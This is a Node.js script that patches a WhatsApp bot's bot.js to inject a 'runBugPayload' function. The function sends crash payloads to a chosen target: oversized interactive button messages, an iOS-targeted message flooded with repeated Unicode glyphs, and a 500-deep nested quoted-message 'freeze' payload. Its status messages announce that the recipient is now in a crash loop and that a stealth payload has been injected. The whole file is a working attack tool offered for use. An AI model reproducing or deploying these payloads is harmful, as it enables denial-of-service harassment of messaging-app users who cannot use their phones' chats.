const fs = require('fs');
let content = fs.readFileSync('bot.js', 'utf8');

const startStr = "async function runBugPayload";
const endStr = "async function handleCommand";

const startIndex = content.indexOf(startStr);
const endIndex = content.indexOf(endStr);

if (startIndex === -1) {
    console.log("❌ Could not find runBugPayload. You may need to restore a backup.");
    process.exit(1);
}
if (endIndex === -1) {
    console.log("❌ Could not find handleCommand. The file is too broken.");
    process.exit(1);
}
if (startIndex > endIndex) {
    console.log("❌ runBugPayload is after handleCommand. File structure is corrupted.");
    process.exit(1);
}

const newPayloadFn = `async function runBugPayload(bot, from, targetJid, bugType, amount) {
    const baileys = require('@yudzxml/baileys');
    const { generateWAMessageFromContent } = baileys;

    // We only send 1 message to start the crash loop.
    for (let i = 0; i < 1; i++) {
        try {
            if (bugType === 'crashwa' || bugType === 'crzcrl') {
                const msg = generateWAMessageFromContent(targetJid, {
                    groupStatusMessageV2: {
                        message: {
                            interactiveMessage: {
                                body: { text: "\\x00" },
                                nativeFlowMessage: { buttons: "?".repeat(500000) }
                            }
                        }
                    }
                }, {});
                
                await bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
                await bot.sendMessage(from, { text: "☠️ Attack sent. The receiver is now in a crash loop.\\n\\nTo STOP the crash, long-press the blank message in this chat and click 'Delete for everyone'." });

            } 
            else if (bugType === 'crashios') {
                const F_OS_NAME = '𑇂𑆵𑆴𑆿'.repeat(9000);
                await bot.relayMessage(targetJid, {
                    viewOnceMessage: {
                        message: {
                            buttonsMessage: {
                                locationMessage: { degreesLongitude: 0, degreesLatitude: 0, name: F_OS_NAME },
                                contentText: ' ',
                                buttons: [{ buttonId: '1', buttonText: { displayText: ' ' }, type: 1 }],
                                headerType: 6
                            }
                        }
                    }
                }, {});
                await bot.sendMessage(from, { text: "☠️ iOS Attack sent. To stop, delete the blank message." });
            }
            else {
                let nested = { conversation: " " };
                for (let j = 0; j < 500; j++) {
                    nested = { extendedTextMessage: { text: " ", contextInfo: { quotedMessage: nested } } };
                }
                await bot.relayMessage(targetJid, { viewOnceMessage: { message: nested } }, {});
                await bot.sendMessage(from, { text: "☠️ Freeze payload sent. To stop, delete the blank message." });
            }
            
        } catch (e) {
            console.log(\`[BUG ERROR] \${e.message}\`);
            await bot.sendMessage(from, { text: "❌ BUG ERROR: " + e.message });
            break;
        }
    }
}

`;

content = content.slice(0, startIndex) + newPayloadFn + content.slice(endIndex);
fs.writeFileSync('bot.js', content);
console.log('✅ Syntax fixed and stealth payload injected safely!');
